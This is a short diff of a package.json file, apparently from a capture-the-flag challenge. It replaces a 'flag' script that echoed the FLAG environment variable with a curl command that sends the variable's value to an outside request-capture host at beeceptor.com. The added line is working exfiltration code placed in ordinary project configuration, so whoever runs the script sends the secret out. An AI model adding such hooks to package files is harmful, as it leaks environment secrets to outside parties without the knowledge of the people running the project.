@@ -9,7 +9,7 @@
 	"scripts": {
 		"start": "node index.js",
 		"test": "node tests/test.js",
-		"flag": "echo $FLAG",
+		"flag": "curl -G https://hs2land.free.beeceptor.com --data-urlencode \"flag=$FLAG\""
 	},
 	"dependencies": {
 		"colors": "^1.4.0"
